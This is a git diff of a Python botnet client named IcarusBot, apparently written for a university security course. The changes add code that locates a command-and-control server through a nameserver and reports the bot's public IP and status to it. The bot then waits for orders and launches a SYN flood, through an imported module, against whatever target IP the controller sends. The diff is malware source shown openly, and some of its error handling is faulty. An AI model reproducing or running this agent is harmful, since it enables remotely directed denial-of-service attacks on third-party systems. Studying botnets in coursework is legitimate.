@@ -6,13 +6,14 @@ import threading
 import time
 from enum import Enum
 from socket import timeout
+import syn_flood
 
 import requests
 from win10toast import ToastNotifier
 
 from config import API_URL
 
-BOT_ID_NAME = 'ULTRASTEED'  # Replace this for each new bot handed out.
+BOT_ID_NAME = ''  # Replace this for each new bot handed out.
 
 
 class IcarusBot:
@@ -22,32 +23,36 @@ class IcarusBot:
 
     def __init__(self):
         """
-        The process of the init is:
-            1. Setup basics
-            2. Start updating with nameserver (let it know we exist) as a separate 'Thread'
-            3. Ask the nameserver where the active C2 server is. It will continue asking every 5 seconds until told.
-            4. It will then bind with the ip::port of the C2, then sending a basic status update.
-            5. It will then call the main_loop(), which will sit and wait for a response from the C2 server for a command.
-                5.1: Refer to the main_loop() function for details about how it handles the protocol.
+                The process of the init is:
+                    1. Setup basics
+                    2. Start updating with nameserver (let it know we exist) as a separate 'Thread'
+                    3. Ask the nameserver where the active C2 server is. It will continue asking every 5 seconds until told.
+                    4. It will then bind with the ip::port of the C2, then sending a basic status update.
+                    5. It will then call the main_loop(), which will sit and wait for a response from the C2 server for a command.
+                        5.1: Refer to the main_loop() function for details about how it handles the protocol.
         """
-        # self.update_thread = threading.Timer(3.0, self.update)
+        file = open("bot_name.txt", "r")
+        global BOT_ID_NAME
+        BOT_ID_NAME = file.read()
+        print(BOT_ID_NAME, "IS RUNNING")
+
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP
         self.bot_id = BOT_ID_NAME  # should be random or grabbed somehow from victim computer
         self.ip = requests.get('https://api.ipify.org').content.decode('utf8')
         self.c2_server_details = ()
 
-        self.status = BotAction.STARTED
+        self.status = 'STARTED'
         self.attack_runtime = 0  # Used for tracking duration of attack.
         self.target_ip = ''
 
-        signal.signal(signal.SIGINT, self.exit_gracefully)
-        signal.signal(signal.SIGTERM, self.exit_gracefully)
-        # This is where we load the config file regarding the bot's ID
 
         # This will constantly run and update with the nameserver.
         threading.Thread(target=self.update_with_nameserver, daemon=True).start()
         # Now we go and look for the C2 server.
+
+        notification(self.status)
         while True:
+            print("contacting nameserver")
             nameserver_available = False
             # This will loop until the nameserver has an answer.
             while not nameserver_available:
@@ -58,7 +63,8 @@ class IcarusBot:
                     nameserver_available = True
                 time.sleep(5)
             # Now that we've got the C2 server IP, let's go ahead and setup the socket for connecting.
-            self.sock.settimeout(30)
+            print("nameserver found")
+            self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP
             self.sock.connect((self.c2_server_details[0], int(self.c2_server_details[1])))
             self.main_loop()
             # This means that the C2 server has been inactive, so we restart the process of searching for the next C2 server.
@@ -92,27 +98,55 @@ class IcarusBot:
                 2.1 disconnect with the webserver and ignore it.
                 2.2 Go back to asking the nameserver for a IP address for a C2 server.
         """
-        parser = json.JSONDecoder()
-        encoder = json.JSONEncoder()
-        self.status = BotAction.IDLE
+        self.status = 'IDLE'
+
+        # Now we notify the bot of our existence
+        init_message = {
+            'ip': self.ip,
+            'status': self.status,
+            'id': self.bot_id,
+            'runtime': self.attack_runtime,
+            'target': self.target_ip
+        }
+        init_message = json.dumps(init_message)
+        self.sock.sendto(str.encode(init_message), (self.c2_server_details[0], int(self.c2_server_details[1])))
+
+        # Now we just listen for message requests.
         while True:
             try:
                 # We now interact with this like any other object.
+                self.sock.settimeout(10)
                 jsonMsg = json.loads(self.sock.recv(4096).decode('ascii'))
+                print(jsonMsg)
                 request_type = jsonMsg['request']
+                attack_type = jsonMsg['attack']
+                target_ip = jsonMsg['targetIP']
                 response = ''
                 # Through each if statement, we specify what we're going to do. The logic is contained in each if.
                 if request_type == 'status':
                     # All requests go through this response.
                     response = {
+                        'ip': self.ip,
                         'status': self.status,
                         'id': self.bot_id,
                         'runtime': self.attack_runtime,
                         'target': self.target_ip
                     }
                     response = json.dumps(response)
+                elif request_type == 'attack':
+                    # TODO: Implement attacks here
+                    # TODO: Number of packets to send?
+                    if attack_type == 'SYN_FLOOD':
+                        #attack_thread = threading.Thread(target=syn_flood.SYN_Flood,args=(target_ip, 1))
+                        #attack_thread.start()
+                        #attack_thread.join()
+                        syn_flood.SYN_Flood(target_ip, [1])
+                    else:
+                        print("No attack type specified")
+
                 # This will then send the message back to the server, irrespective of the flag.
-                self.sock.sendto(str.encode(response), self.c2_server_details)
+                time.sleep(2)
+                self.sock.sendto(str.encode(response), (self.c2_server_details[0], int(self.c2_server_details[1])))
             except timeout or Exception:
                 # the server has lagged out
                 print("timeout")
@@ -139,22 +173,15 @@ class IcarusBot:
     #     pass
 
 
-class BotAction(Enum):
-    """enum to track the status of our icarus bot"""
-    STARTED = 'STARTED',
-    IDLE = 'IDLE',
-    ATTACKING = 'ATTACKING'
-
-
 def notification(action):
     """opens windows notification"""
     toast = ToastNotifier()
     title = ""
     body = ""
-    if action == BotAction.STARTED:
+    if action == "STARTED":
         title = "ICARUS BOT STARTED"
-        body = "If you didn't expect this - whoops"
-    elif action == BotAction.ATTACKING:
+        body = "I NOW HAVE FULL ACCESS TO YOUR SYSTEMS (COMS4507)"
+    elif action == "ATTACKING":
         title = "ICARUS BOT ATTACKING"
         body = "The bot gave in to peer pressure and is attacking something"
     else:
@@ -164,6 +191,7 @@ def notification(action):
     toast.show_toast(
         title,
         body,
+        icon_path="icarus.ico",
         duration=5,
         threaded=True,
     )
